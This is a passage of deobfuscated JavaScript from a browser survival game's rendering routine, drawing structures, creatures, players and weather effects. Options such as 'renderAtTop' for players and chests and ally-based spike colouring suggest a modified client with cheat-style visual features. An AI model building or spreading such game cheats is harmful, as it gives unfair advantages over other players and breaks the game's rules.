            zo(G[s], Ie.DOOR_DIAMOND_OPEN);
          }
        }
        G = s_.units[us.AMETHYST_DOOR_SPIKE];
        s = 0;
        for (; s < G.length; s++) {
          if (G[s].info) {
            zo(G[s], Ie.DOOR_AMETHYST_OPEN);
          }
        }
        G = s_.units[us.REIDITE_DOOR_SPIKE];
        s = 0;
        for (; s < G.length; s++) {
          if (G[s].info) {
            zo(G[s], Ie.DOOR_GOLD_OPEN);
          }
        }
        G = s_.units[us.WOOD_DOOR];
        s = 0;
        for (; s < G.length; s++) {
          if (G[s].info & 1) {
            zo(G[s], Ie.DOOR_WOOD_OPEN);
          }
        }
        G = s_.units[us.STONE_DOOR];
        s = 0;
        for (; s < G.length; s++) {
          if (G[s].info & 1) {
            zo(G[s], Ie.DOOR_STONE_OPEN);
          }
        }
        G = s_.units[us.GOLD_DOOR];
        s = 0;
        for (; s < G.length; s++) {
          if (G[s].info) {
            zo(G[s], Ie.DOOR_GOLD_OPEN);
          }
        }
        G = s_.units[us.DIAMOND_DOOR];
        s = 0;
        for (; s < G.length; s++) {
          if (G[s].info) {
            zo(G[s], Ie.DOOR_DIAMOND_OPEN);
          }
        }
        G = s_.units[us.AMETHYST_DOOR];
        s = 0;
        for (; s < G.length; s++) {
          if (G[s].info) {
            zo(G[s], Ie.DOOR_AMETHYST_OPEN);
          }
        }
        G = s_.units[us.REIDITE_DOOR];
        s = 0;
        for (; s < G.length; s++) {
          if (G[s].info) {
            zo(G[s], Ie.DOOR_GOLD_OPEN);
          }
        }
        var f = s_.units[us.RABBIT];
        for (s = 0; s < f.length; s++) {
          zo(f[s], Ie.RABBIT, Ie.HURT_RABBIT);
        }
        var H = s_.units[us.BED];
        for (s = 0; s < H.length; s++) {
          zo(H[s], Ie.BED);
        }
        o = s_.units[us.SAND_WORM];
        s = 0;
        for (; s < o.length; s++) {
          zo(o[s], Ie.SAND_WORM, Ie.HURT_SAND_WORM);
        }
        var P = s_.units[us.SPELL];
        for (s = 0; s < P.length; s++) {
          if (P[s].fly === 0) {
            zo(P[s]);
          }
        }
        _ = s_.units[us.PLAYERS];
        if (!r.visuals.renderAtTop.players) {
          for (s = 0; s < _.length; s++) {
            E = _[s];
            if (_[s].vehicle !== le.BABY_DRAGON && _[s].vehicle !== le.BABY_LAVA && _[s].vehicle !== le.HAWK && _[s].vehicle !== le.PLANE && _[s].vehicle !== le.NIMBUS) {
              if (E.tower === 0) {
                if (E.tower_fx > 0.001) {
                  E.tower_fx = Utils.lerp(E.tower_fx, 0, 0.018);
                  var y = 1 + Math.min(1, Math.max(E.tower_fx, 0) / 100) * 0.18;
                  D.save();
                  D.scale(y, y);
                  __.cam.x /= y;
                  __.cam.y /= y;
                  E.x /= y;
                  E.y /= y;
                  E.r.x /= y;
                  E.r.y /= y;
                  E.draw_vehicle();
                  E.draw();
                  __.cam.x *= y;
                  __.cam.y *= y;
                  E.x *= y;
                  E.y *= y;
                  E.r.x *= y;
                  E.r.y *= y;
                  D.restore();
                } else {
                  E.fly = 0;
                  E.draw_vehicle();
                  E.draw();
                }
              }
            } else if (E.speed <= 180) {
              D.save();
              y = 1 + Math.min(1, Math.max(E.vehicle_fx5 - 30, 0) / 180) * 0.35;
              D.scale(y, y);
              __.cam.x /= y;
              __.cam.y /= y;
              E.x /= y;
              E.y /= y;
              E.r.x /= y;
              E.r.y /= y;
              E.fly = 0;
              E.draw_vehicle();
              E.draw();
              __.cam.x *= y;
              __.cam.y *= y;
              E.x *= y;
              E.y *= y;
              E.r.x *= y;
              E.r.y *= y;
              D.restore();
            }
          }
        }
        H = s_.units[us.BED];
        s = 0;
        for (; s < H.length; s++) {
          zo(H[s], Ie.BED_TOP);
        }
        var B = s_.units[us.CRAB];
        for (s = 0; s < B.length; s++) {
          zo(B[s]);
        }
        var z = s_.units[us.FOX];
        for (s = 0; s < z.length; s++) {
          zo(z[s], Ie.FOX, Ie.HURT_FOX);
        }
        var W = s_.units[us.BOAR];
        for (s = 0; s < W.length; s++) {
          zo(W[s]);
        }
        var V = s_.units[us.WOLF];
        for (s = 0; s < V.length; s++) {
          zo(V[s], Ie.WOLF, Ie.HURT_WOLF);
        }
        var w = s_.units[us.BABY_DRAGON];
        for (s = 0; s < w.length; s++) {
          zo(w[s], Ie.BABY_DRAGON, Ie.HURT_BABY_DRAGON);
        }
        var K = s_.units[us.BABY_LAVA];
        for (s = 0; s < K.length; s++) {
          zo(K[s], Ie.BABY_LAVA, Ie.HURT_BABY_LAVA);
        }
        g = s_.units[us.CARROT_SEED];
        s = 0;
        for (; s < g.length; s++) {
          if ((g[s].info & 15) != 0 && g[s].info !== 10) {
            zo(g[s]);
          }
        }
        C = s_.units[us.WATERMELON_SEED];
        s = 0;
        for (; s < C.length; s++) {
          if ((C[s].info & 15) != 0 && C[s].info !== 10) {
            zo(C[s]);
          }
        }
        N = s_.units[us.ALOE_VERA_MOB];
        s = 0;
        for (; s < N.length; s++) {
          zo(N[s], Ie.ALOE_VERA);
        }
        N = s_.units[us.ALOE_VERA_SEED];
        s = 0;
        for (; s < N.length; s++) {
          if ((N[s].info & 15) != 0 && N[s].info !== 10) {
            zo(N[s]);
          }
        }
        R = s_.units[us.TOMATO_SEED];
        s = 0;
        for (; s < R.length; s++) {
          Lo(R[s]);
        }
        S = s_.units[us.GARLIC_SEED];
        s = 0;
        for (; s < S.length; s++) {
          if ((S[s].info & 15) != 0 && S[s].info !== 10) {
            zo(S[s]);
          }
        }
        p = s_.units[us.THORNBUSH_SEED];
        s = 0;
        for (; s < p.length; s++) {
          if ((p[s].info & 15) != 0 && p[s].info !== 10) {
            zo(p[s]);
          }
        }
        m = s_.units[us.PUMPKIN_SEED];
        s = 0;
        for (; s < m.length; s++) {
          if ((m[s].info & 15) != 0 && m[s].info !== 10) {
            zo(m[s]);
          }
        }
        var U = s_.units[us.TREASURE_CHEST];
        for (s = 0; s < U.length; s++) {
          zo(U[s], Ie.TREASURE_CHEST, Ie.HURT_TREASURE_CHEST);
        }
        var Y = s_.units[us.KRAKEN];
        for (s = 0; s < Y.length; s++) {
          zo(Y[s], Ie.KRAKEN, Ie.HURT_KRAKEN);
        }
        var k = s_.units[us.PIRANHA];
        for (s = 0; s < k.length; s++) {
          zo(k[s], Ie.PIRANHA, Ie.HURT_PIRANHA);
        }
        var F = s_.units[us.SPIDER];
        for (s = 0; s < F.length; s++) {
          zo(F[s], Ie.SPIDER, Ie.HURT_SPIDER);
        }
        var x = s_.units[us.PENGUIN];
        for (s = 0; s < x.length; s++) {
          zo(x[s], Ie.PENGUIN, Ie.HURT_PENGUIN);
        }
        var J = s_.units[us.BEAR];
        for (s = 0; s < J.length; s++) {
          zo(J[s], Ie.BEAR, Ie.HURT_BEAR);
        }
        var X = s_.units[us.BABY_MAMMOTH];
        for (s = 0; s < X.length; s++) {
          zo(X[s]);
        }
        var q = s_.units[us.FLAME];
        for (s = 0; s < q.length; s++) {
          zo(q[s], Ie.FIRE_MOB, Ie.HURT_FIRE_MOB);
        }
        var j = s_.units[us.CRAB_BOSS];
        for (s = 0; s < j.length; s++) {
          zo(j[s]);
        }
        var Z = s_.units[us.MAMMOTH];
        for (s = 0; s < Z.length; s++) {
          zo(Z[s], Ie.MAMMOTH, Ie.HURT_MAMMOTH);
        }
        var Q = s_.units[us.DRAGON];
        for (s = 0; s < Q.length; s++) {
          if (Q[s].scale === 1) {
            zo(Q[s], Ie.DRAGON, Ie.HURT_DRAGON);
          }
        }
        Q = s_.units[us.LAVA_DRAGON];
        s = 0;
        for (; s < Q.length; s++) {
          if (Q[s].scale === 1) {
            zo(Q[s], Ie.LAVA_DRAGON, Ie.HURT_LAVA_DRAGON);
          }
        }
        var $ = s_.units[us.CHEST];
        if (!r.visuals.renderAtTop.chests) {
          for (s = 0; s < $.length; s++) {
            zo($[s]);
          }
        }
        var ee = s_.units[us.WORKBENCH];
        for (s = 0; s < ee.length; s++) {
          zo(ee[s], Ie.WORKBENCH);
        }
        d = s_.units[us.FURNACE];
        s = 0;
        for (; s < d.length; s++) {
          zo(d[s]);
        }
        var ie = s_.units[us.BREAD_OVEN];
        for (s = 0; s < ie.length; s++) {
          zo(ie[s]);
        }
        if (!r.visuals.renderAtTop.totems) {
          var te = s_.units[us.TOTEM];
          for (s = 0; s < te.length; s++) {
            zo(te[s], Ie.TOTEM);
          }
        }
        G = s_.units[us.WOOD_DOOR];
        s = 0;
        for (; s < G.length; s++) {
          if (!(G[s].info & 1)) {
            zo(G[s], r.visuals.info.coloredspike ? t.isAlly(G[s].pid) ? 10024 : 10025 : Ie.DOOR_WOOD_CLOSE);
          }
          G[s].draw_life(G[s].info >> 1);
        }
        G = s_.units[us.STONE_DOOR];
        s = 0;
        for (; s < G.length; s++) {
          if (!(G[s].info & 1)) {
            zo(G[s], r.visuals.info.coloredspike ? t.isAlly(G[s].pid) ? 10026 : 10027 : Ie.DOOR_STONE_CLOSE);
          }
          G[s].draw_life(G[s].info >> 1);
        }
        G = s_.units[us.GOLD_DOOR];
        s = 0;
        for (; s < G.length; s++) {
          if (!(G[s].info & 1)) {
            zo(G[s], r.visuals.info.coloredspike ? t.isAlly(G[s].pid) ? 10028 : 10029 : Ie.DOOR_GOLD_CLOSE);
          }
          G[s].draw_life(G[s].info >> 1);
        }
        G = s_.units[us.DIAMOND_DOOR];
        s = 0;
        for (; s < G.length; s++) {
          if (!(G[s].info & 1)) {
            zo(G[s], r.visuals.info.coloredspike ? t.isAlly(G[s].pid) ? 10030 : 10031 : Ie.DOOR_DIAMOND_CLOSE);
          }
          G[s].draw_life(G[s].info >> 1);
        }
        G = s_.units[us.AMETHYST_DOOR];
        s = 0;
        for (; s < G.length; s++) {
          if (!(G[s].info & 1)) {
            zo(G[s], r.visuals.info.coloredspike ? t.isAlly(G[s].pid) ? 10032 : 10033 : Ie.DOOR_AMETHYST_CLOSE);
          }
          G[s].draw_life(G[s].info >> 1);
        }
        G = s_.units[us.REIDITE_DOOR];
        s = 0;
        for (; s < G.length; s++) {
          if (!(G[s].info & 1)) {
            zo(G[s], r.visuals.info.coloredspike ? t.isAlly(G[s].pid) ? 10034 : 10035 : Ie.REIDITE_DOOR);
          }
          G[s].draw_life(G[s].info >> 1);
        }
        G = s_.units[us.WOOD_DOOR_SPIKE];
        s = 0;
        for (; s < G.length; s++) {
          if (!(G[s].info & 1)) {
            zo(G[s], r.visuals.info.coloredspike ? t.isAlly(G[s].pid) ? 10012 : 10013 : Ie.WOOD_DOOR_SPIKE);
          }
          G[s].draw_life(G[s].info >> 1);
        }
        G = s_.units[us.STONE_DOOR_SPIKE];
        s = 0;
        for (; s < G.length; s++) {
          if (!(G[s].info & 1)) {
            zo(G[s], r.visuals.info.coloredspike ? t.isAlly(G[s].pid) ? 10014 : 10015 : Ie.STONE_DOOR_SPIKE);
          }
          G[s].draw_life(G[s].info >> 1);
        }
        G = s_.units[us.GOLD_DOOR_SPIKE];
        s = 0;
        for (; s < G.length; s++) {
          if (!(G[s].info & 1)) {
            zo(G[s], r.visuals.info.coloredspike ? t.isAlly(G[s].pid) ? 10016 : 10017 : Ie.GOLD_DOOR_SPIKE);
          }
          G[s].draw_life(G[s].info >> 1);
        }
        G = s_.units[us.DIAMOND_DOOR_SPIKE];
        s = 0;
        for (; s < G.length; s++) {
          if (!(G[s].info & 1)) {
            zo(G[s], r.visuals.info.coloredspike ? t.isAlly(G[s].pid) ? 10018 : 10019 : Ie.DIAMOND_DOOR_SPIKE);
          }
          G[s].draw_life(G[s].info >> 1);
        }
        G = s_.units[us.AMETHYST_DOOR_SPIKE];
        s = 0;
        for (; s < G.length; s++) {
          if (!(G[s].info & 1)) {
            zo(G[s], r.visuals.info.coloredspike ? t.isAlly(G[s].pid) ? 10020 : 10021 : Ie.AMETHYST_DOOR_SPIKE);
          }
          G[s].draw_life(G[s].info >> 1);
        }
        G = s_.units[us.REIDITE_DOOR_SPIKE];
        s = 0;
        for (; s < G.length; s++) {
          if (!(G[s].info & 1)) {
            zo(G[s], r.visuals.info.coloredspike ? t.isAlly(G[s].pid) ? 10022 : 10023 : Ie.REIDITE_DOOR_SPIKE);
          }
          G[s].draw_life(G[s].info >> 1);
        }
        var re = s_.units[us.WALL];
        for (s = 0; s < re.length; s++) {
          zo(re[s], Ie.WALL);
          re[s].draw_life(re[s].info);
        }
        re = s_.units[us.STONE_WALL];
        s = 0;
        for (; s < re.length; s++) {
          zo(re[s], Ie.STONE_WALL);
          re[s].draw_life(re[s].info);
        }
        re = s_.units[us.GOLD_WALL];
        s = 0;
        for (; s < re.length; s++) {
          zo(re[s], Ie.GOLD_WALL);
          re[s].draw_life(re[s].info);
        }
        re = s_.units[us.DIAMOND_WALL];
        s = 0;
        for (; s < re.length; s++) {
          zo(re[s], Ie.DIAMOND_WALL);
          re[s].draw_life(re[s].info);
        }
        re = s_.units[us.AMETHYST_WALL];
        s = 0;
        for (; s < re.length; s++) {
          zo(re[s], Ie.AMETHYST_WALL);
          re[s].draw_life(re[s].info);
        }
        re = s_.units[us.REIDITE_WALL];
        s = 0;
        for (; s < re.length; s++) {
          zo(re[s], Ie.REIDITE_WALL);
          re[s].draw_life(re[s].info);
        }
        var ne = s_.units[us.SPIKE];
        for (s = 0; s < ne.length; s++) {
          zo(ne[s], r.visuals.info.coloredspike ? t.isAlly(ne[s].pid) ? 10000 : 10001 : Ie.SPIKE);
          ne[s].draw_life(ne[s].info);
        }
        ne = s_.units[us.STONE_SPIKE];
        s = 0;
        for (; s < ne.length; s++) {
          zo(ne[s], r.visuals.info.coloredspike ? t.isAlly(ne[s].pid) ? 10002 : 10003 : Ie.STONE_SPIKE);
          ne[s].draw_life(ne[s].info);
        }
        ne = s_.units[us.GOLD_SPIKE];
        s = 0;
        for (; s < ne.length; s++) {
          zo(ne[s], r.visuals.info.coloredspike ? t.isAlly(ne[s].pid) ? 10004 : 10005 : Ie.GOLD_SPIKE);
          ne[s].draw_life(ne[s].info);
        }
        ne = s_.units[us.DIAMOND_SPIKE];
        s = 0;
        for (; s < ne.length; s++) {
          zo(ne[s], r.visuals.info.coloredspike ? t.isAlly(ne[s].pid) ? 10006 : 10007 : Ie.DIAMOND_SPIKE);
          ne[s].draw_life(ne[s].info);
        }
        ne = s_.units[us.AMETHYST_SPIKE];
        s = 0;
        for (; s < ne.length; s++) {
          zo(ne[s], r.visuals.info.coloredspike ? t.isAlly(ne[s].pid) ? 10008 : 10009 : Ie.AMETHYST_SPIKE);
          ne[s].draw_life(ne[s].info);
        }
        ne = s_.units[us.REIDITE_SPIKE];
        s = 0;
        for (; s < ne.length; s++) {
          zo(ne[s], r.visuals.info.coloredspike ? t.isAlly(ne[s].pid) ? 10010 : 10011 : Ie.REIDITE_SPIKE);
          ne[s].draw_life(ne[s].info);
        }
        var ae = s_.units[us.WELL];
        for (s = 0; s < ae.length; s++) {
          var oe = ae[s];
          if (oe.info > 0) {
            zo(oe, Ie.WELL_FULL);
          } else {
            zo(oe, Ie.WELL_EMPTY);
          }
        }
        Wo(No, n, a, e, i, Ie.GOLD, "g", 2);
        Wo(No, n, a, e, i, Ie.GOLD_WINTER, "gw", 2);
        Wo(No, n, a, e, i, Ie.DIAMOND, "d", 2);
        Wo(No, n, a, e, i, Ie.DIAMOND_WINTER, "dw", 2);
        Wo(No, n, a, e, i, Ie.PLANT, "p", 0);
        Wo(No, n, a, e, i, Ie.EMERALD, "m", 2);
        Wo(No, n, a, e, i, Ie.AMETHYST, "a", 2);
        Wo(No, n, a, e, i, Ie.REIDITE, "re", 2);
        Wo(No, n, a, e, i, Ie.SHADOW_CAVE_STONES, "cs", 3, 3);
        Wo(No, n, a, e, i, Ie.SHADOW_CAVE_STONES, "cs", 2, 2);
        Wo(No, n, a, e, i, Ie.SHADOW_CAVE_STONES, "cs", 1, 1);
        Wo(No, n, a, e, i, Ie.SHADOW_CAVE_STONES, "cs", 0, 0);
        Wo(No, n, a, e, i, Ie.CAVE_STONES, "cs", 3, 3);
        Wo(No, n, a, e, i, Ie.CAVE_STONES, "cs", 2, 2);
        Wo(No, n, a, e, i, Ie.CAVE_STONES, "cs", 1, 1);
        Wo(No, n, a, e, i, Ie.CAVE_STONES, "cs", 0, 0);
        var se = s_.units[us.FRUIT];
        for (s = 0; s < se.length; s++) {
          for (T = 0; T < se[s].info; T++) {
            zo(se[s].fruits[T], Ie.FRUIT);
          }
        }
        Wo(No, n, a, e, i, Ie.STONES, "s", 2);
        var _e = s_.units[us.EXTRACTOR_MACHINE_STONE];
        for (s = 0; s < _e.length; s++) {
          zo(_e[s]);
        }
        _e = s_.units[us.EXTRACTOR_MACHINE_GOLD];
        s = 0;
        for (; s < _e.length; s++) {
          zo(_e[s]);
        }
        _e = s_.units[us.EXTRACTOR_MACHINE_DIAMOND];
        s = 0;
        for (; s < _e.length; s++) {
          zo(_e[s]);
        }
        _e = s_.units[us.EXTRACTOR_MACHINE_AMETHYST];
        s = 0;
        for (; s < _e.length; s++) {
          zo(_e[s]);
        }
        _e = s_.units[us.EXTRACTOR_MACHINE_REIDITE];
        s = 0;
        for (; s < _e.length; s++) {
          zo(_e[s]);
        }
        var Ee = s_.units[us.WINDMILL];
        for (s = 0; s < Ee.length; s++) {
          Mo(Ee[s]);
        }
        h = s_.units[us.FIRE];
        s = 0;
        for (; s < h.length; s++) {
          Lo(h[s]);
        }
        h = s_.units[us.BIG_FIRE];
        s = 0;
        for (; s < h.length; s++) {
          Lo(h[s]);
        }
        d = s_.units[us.FURNACE];
        s = 0;
        for (; s < d.length; s++) {
          if (d[s].action == 2) {
            Lo(d[s]);
          }
        }
        ie = s_.units[us.BREAD_OVEN];
        s = 0;
        for (; s < ie.length; s++) {
          Lo(ie[s]);
        }
        I = s_.units[us.RESURRECTION];
        s = 0;
        for (; s < I.length; s++) {
          Lo(I[s]);
        }
        u = s_.units[us.EMERALD_MACHINE];
        s = 0;
        for (; s < u.length; s++) {
          Lo(u[s]);
          u[s].draw_life(u[s].info);
        }
        Wo(No, n, a, e, i, Ie.CACTUS, "c", 0);
        Wo(No, n, a, e, i, Ie.TREE, "t", 5, 4);
        Wo(No, n, a, e, i, Ie.FIR, "f", 2, 2);
        Wo(No, n, a, e, i, Ie.PALM, "plm", 0, 0);
        Wo(No, n, a, e, i, Ie.TREE_BRANCH, "b", 3, 2);
        Wo(No, n, a, e, i, Ie.TREE, "t", 3, 2);
        Wo(No, n, a, e, i, Ie.TREE_BRANCH, "b", 1, 0);
        Wo(No, n, a, e, i, Ie.FIR, "f", 1, 1);
        Wo(No, n, a, e, i, Ie.PALM, "plm", 1, 1);
        Wo(No, n, a, e, i, Ie.TREE, "t", 1, 0);
        Wo(No, n, a, e, i, Ie.FIR, "f", 0, 0);
        Wo(No, n, a, e, i, Ie.PALM, "plm", 2, 2);
        Ee = s_.units[us.WINDMILL];
        s = 0;
        for (; s < Ee.length; s++) {
          Lo(Ee[s]);
        }
        var Te = s_.units[us.WOOD_TOWER];
        for (s = 0; s < Te.length; s++) {
          zo(Te[s], Ie.WOOD_TOWER);
        }
        _ = s_.units[us.PLAYERS];
        s = 0;
        for (; s < _.length; s++) {
          if ((E = _[s]).tower === 1 && (E.speed < 180 || E.vehicle !== le.BABY_DRAGON && E.vehicle !== le.BABY_LAVA && E.vehicle !== le.NIMBUS && E.vehicle !== le.HAWK && E.vehicle !== le.PLANE)) {
            E.tower_fx = Utils.lerp(E.tower_fx, 100, 0.018);
            y = 1 + Math.min(1, Math.max(E.tower_fx, 0) / 100) * 0.18;
            D.save();
            D.scale(y, y);
            __.cam.x /= y;
            __.cam.y /= y;
            E.x /= y;
            E.y /= y;
            E.r.x /= y;
            E.r.y /= y;
            E.draw_vehicle();
            E.draw();
            __.cam.x *= y;
            __.cam.y *= y;
            E.x *= y;
            E.y *= y;
            E.r.x *= y;
            E.r.y *= y;
            D.restore();
          }
        }
        var Ae = s_.units[us.ROOF];
        for (s = 0; s < Ae.length; s++) {
          zo(Ae[s], Ie.ROOF);
          Ae[s].draw_life(Ae[s].info);
        }
        var de = s_.units[us.FIREFLY];
        for (s = 0; s < de.length; s++) {
          zo(de[s], Ie.FIREFLY, Ie.HURT_FIREFLY);
        }
        var he = s_.units[us.GARLAND];
        for (s = 0; s < he.length; s++) {
          zo(he[s], Ie.GARLAND);
        }
        _ = s_.units[us.PLAYERS];
        s = 0;
        for (; s < _.length; s++) {
          if (((E = _[s]).vehicle === le.BABY_DRAGON || E.vehicle === le.BABY_LAVA || E.vehicle === le.NIMBUS || E.vehicle === le.HAWK || E.vehicle === le.PLANE) && E.speed > 180) {
            E.fly = 1;
            D.save();
            y = 1 + Math.min(1, Math.max(E.vehicle_fx5 - 30, 0) / 180) * 0.35;
            D.scale(y, y);
            __.cam.x /= y;
            __.cam.y /= y;
            E.x /= y;
            E.y /= y;
            E.r.x /= y;
            E.r.y /= y;
            E.draw_vehicle();
            E.draw();
            __.cam.x *= y;
            __.cam.y *= y;
            E.x *= y;
            E.y *= y;
            E.r.x *= y;
            E.r.y *= y;
            D.restore();
          }
        }
        P = s_.units[us.SPELL];
        s = 0;
        for (; s < P.length; s++) {
          if (P[s].fly === 1) {
            zo(P[s]);
          }
        }
        Q = s_.units[us.DRAGON];
        s = 0;
        for (; s < Q.length; s++) {
          if (Q[s].scale > 1) {
            zo(Q[s], Ie.DRAGON, Ie.HURT_DRAGON);
          }
        }
        Q = s_.units[us.LAVA_DRAGON];
        s = 0;
        for (; s < Q.length; s++) {
          if (Q[s].scale > 1) {
            zo(Q[s], Ie.LAVA_DRAGON, Ie.HURT_LAVA_DRAGON);
          }
        }
        var ue = s_.units[us.HAWK];
        for (s = 0; s < ue.length; s++) {
          zo(ue[s], Ie.HAWK, Ie.HURT_HAWK);
        }
        var Oe = s_.units[us.VULTURE];
        for (s = 0; s < Oe.length; s++) {
          zo(Oe[s], Ie.VULTURE, Ie.HURT_VULTURE);
        }
        if ((Oo += I_ * 15) > 60) {
          Oo -= 60;
        }
        Wo(co, n, a, e, i, Ie.FOG, "fo", 2);
        Wo(co, n, a, e, i, Ie.FOD, "fod", 2);
        if (r.visuals.renderAtTop.totems) {
          te = s_.units[us.TOTEM];
          s = 0;
          te = s_.units[us.TOTEM];
          s = 0;
          for (; s < te.length; s++) {
            zo(te[s], Ie.TOTEM);
          }
        }
        if (r.visuals.renderAtTop.chests) {
          for (s = 0; s < $.length; s++) {
            zo($[s]);
          }
        }
        if (r.visuals.renderAtTop.boxes) {
          for (s = 0; s < v.length; s++) {
            zo(v[s], Ie.CRATE, Ie.HURT_DEAD_BOX);
          }
          M = s_.units[us.DEAD_BOX];
          s = 0;
          for (; s < M.length; s++) {
            zo(M[s], Ie.CRATE, Ie.HURT_DEAD_BOX);
          }
        }
        if (r.visuals.renderAtTop.players) {
          for (s = 0; s < _.length; s++) {
            E = _[s];
            if (_[s].vehicle !== le.BABY_DRAGON && _[s].vehicle !== le.BABY_LAVA && _[s].vehicle !== le.HAWK && _[s].vehicle !== le.PLANE && _[s].vehicle !== le.NIMBUS) {
              if (E.tower === 0) {
                if (E.tower_fx > 0.001) {
                  E.tower_fx = Utils.lerp(E.tower_fx, 0, 0.018);
                  y = 1 + Math.min(1, Math.max(E.tower_fx, 0) / 100) * 0.18;
                  D.save();
                  D.scale(y, y);
                  __.cam.x /= y;
                  __.cam.y /= y;
                  E.x /= y;
                  E.y /= y;
                  E.r.x /= y;
                  E.r.y /= y;
                  E.draw_vehicle();
                  E.draw();
                  __.cam.x *= y;
                  __.cam.y *= y;
                  E.x *= y;
                  E.y *= y;
                  E.r.x *= y;
                  E.r.y *= y;
                  D.restore();
                } else {
                  E.fly = 0;
                  E.draw_vehicle();
                  E.draw();
                }
              }
            } else if (E.speed <= 180) {
              D.save();
              y = 1 + Math.min(1, Math.max(E.vehicle_fx5 - 30, 0) / 180) * 0.35;
              D.scale(y, y);
              __.cam.x /= y;
              __.cam.y /= y;
              E.x /= y;
              E.y /= y;
              E.r.x /= y;
              E.r.y /= y;
              E.fly = 0;
              E.draw_vehicle();
              E.draw();
              __.cam.x *= y;
              __.cam.y *= y;
              E.x *= y;
              E.y *= y;
              E.r.x *= y;
              E.r.y *= y;
              D.restore();
            }
          }
        }
      })();
      if (n_.quality && s_.mode !== ds.MODE_ZOMBIES && s_.mode !== ds.MODE_LEGACY && s_.mode !== ds.MODE_BR) {
        (function () {
          var e = __.desert;
          if (e.tempest === 0) {
            e.tempest_speed = Math.max(0, e.tempest_speed - I_ / 10);
          } else {
            e.tempest_speed = Math.min(1, e.tempest_speed + I_ / 10);
          }
          for (var i = e.flakes, t = 0; t < i.length; t++) {
            var r = i[t];
            e.update(r);
            Bo(Ie.DESERT, r.id, __.cam.x + r.x, __.cam.y + r.y, r.alpha);
          }
          for (t = 0; t < i.length; t++) {
            if ((r = i[t]).life <= 0 || r.x > -__.cam.x + S || r.x < -__.cam.x - __.cam.w / 2 || r.y > -__.cam.y + p) {
              i.splice(t, 1);
            }
          }
          var n = -__.cam.y;
          if (s_.dist_desert > -1000) {
            e.add(n);
          }
        })();
        (function () {
          var e = __.winter;
          if (e.tempest === 0) {
            e.tempest_speed = Math.max(0, e.tempest_speed - I_ / 10);
          } else {
            e.tempest_speed = Math.min(1, e.tempest_speed + I_ / 10);
          }
          for (var i = e.flakes, t = 0; t < i.length; t++) {
            var r = i[t];
            e.update(r);
            Bo(Ie.FLAKES, r.id, __.cam.x + r.x, __.cam.y + r.y, r.alpha);
          }
          for (t = 0; t < i.length; t++) {
            if ((r = i[t]).life <= 0 || r.x > -__.cam.x + S || r.x < -__.cam.x || r.y > -__.cam.y + p) {
              i.splice(t, 1);
            }
          }
          var n = -__.cam.y;
          if (s_.dist_winter > -1000) {
            e.add(n);
          }
        })();
        (function () {
          for (var e = __.ash, i = e.flakes, t = 0; t < i.length; t++) {
            var r = i[t];
            e.update(r);
            Bo(Ie.ASHES, r.id, __.cam.x + r.x, __.cam.y + r.y, r.alpha);
          }
          for (t = 0; t < i.length; t++) {
            if ((r = i[t]).life <= 0 || r.x > -__.cam.x + S || r.x < -__.cam.x || r.y > -__.cam.y + p) {
              i.splice(t, 1);
            }
          }
          var n = -__.cam.y;
          if (s_.dist_lava > -1000) {
            e.add(n);
          }
        })();
      }
      if (s_.transition && e) {
        s_.transition = false;
        s_.shade.v = 0;
        s_.shade.o = false;
      }
    }
    var qo = 0;
    var jo = 1;
    var Zo = 2;
    var Qo = 0;
    var $o = 1;
    var es = 2;
    function is(e, i) {
      var t = e.getBoundingClientRect();
      return {
        x: i.clientX - t.left,
        y: i.clientY - t.top
      };
    }
    function ts(e, i, t, r, n, a, o, s, _, E, T, A, d, h, I) {
      if (e.length === 0) {
        e = " ";
      }
      if (o === undefined) {
        o = 0;
      }
      if (s === undefined) {
        s = 0;
      }
      if (_ === undefined) {
        _ = 0;
      }
      if (h === undefined) {
        h = 0;
      }
      var u = document.createElement("canvas");
      var l = u.getContext("2d");
      l.textBaseline = "middle";
      l.font = (I !== undefined ? I + " " : "") + r + "px Baloo Paaji";
      n = n !== undefined ? Math.min(l.measureText(e).width, n) : l.measureText(e).width;
      u.width = n + o;
      u.height = r + s;
      if (a !== undefined) {
        if (T !== undefined) {
          l.globalAlpha = T;
        }
        l.fillStyle = a;
        if (A !== undefined) {
          roundRect(l, _ + 2, _, n + o - _ * 2 - 4, r + s - _ * 2, A);
          l.fill();
        } else {
          l.fillRect(_, _, n + o - _ * 2, r + s - _ * 2);
        }
        l.globalAlpha = 1;
        if (_ !== 0) {
          l.lineWidth = _;
          l.strokeStyle = E;
          l.stroke();
        }
      }
      l.textBaseline = "middle";
      l.font = (I !== undefined ? I + " " : "") + r + "px Baloo Paaji";
      if (d !== undefined) {
        l.strokeStyle = d;
        l.lineWidth = h;
        l.lineJoin = "miter";
        l.miterLimit = 2;
        l.strokeText(e, Math.floor(o / 2), Math.floor(s / 2) + Math.floor(r / 2), n);
      }
      l.fillStyle = t;
      l.fillText(e, Math.floor(o / 2), Math.floor(s / 2) + Math.floor(r / 2), n);
      u.w2 = u.width / 2;
      u.h2 = u.height / 2;
      return u;
    }
    function rs(e, i, t, r, n, a, o, s, _, E, T) {
      if (_ === undefined) {
        _ = 0;
      }
      if (s === undefined) {
        s = 0;
      }
      if (E === undefined) {
        E = 0;
      }
      if (T === undefined) {
        T = 1;
      }
      if (a !== 1) {
        a = 0;
      }
      if (r) {
        var A = r;
      }
      var d;
      var h = {
        width: e,
        height: i,
        img: A,
        state: Qo,
        translate: {
          x: s,
          y: _,
          _x: s,
          _y: _
        },
        enable_breath: a,
        breath: 0,
        callback: o,
        position: E,
        active: T
      };
      var I = function () {
        return h.img[h.state];
      };
      var u = function (e) {
        var i = h.translate;
        if (!(h.width !== 0 && h.height !== 0)) {
          h.width = h.img[0].width;
          h.height = h.img[0].height;
        }
        return e.x > i.x && e.x < i.x + h.width / n && e.y > i.y && e.y < i.y + h.height / n;
      };
      a = function () {
        var e = 0;
        if (h.enable_breath === 1) {
          if (h.state === $o || h.state === es) {
            h.breath = (h.breath + I_ * 1000) % 1000;
          } else if (h.breath > 0) {
            h.breath = h.breath > 500 ? h.breath + I_ * 1000 : h.breath - I_ * 1000;
            if (h.breath < 0 || h.breath > 1000) {
              h.breath = 0;
            }
          }
          e = Utils.ease_in_out_quad(h.breath > 500 ? (1000 - h.breath) / 500 : h.breath / 500) * 0.2;
        }
        return e;
      };
      if ((n = n === 3 ? 3 : n === 1 ? 2 : 1) === 2) {
        d = function (e) {
          var i = 1 + a();
          var t = I();
          var r = h.width * i / 2;
          var n = h.height * i / 2;
          var o = (r - h.width / 2) / 2;
          var s = (n - h.height / 2) / 2;
          Nn(e, t, h.translate.x - o, h.translate.y - s, r, n);
        };
      } else if (n === 3) {
        d = function (e) {
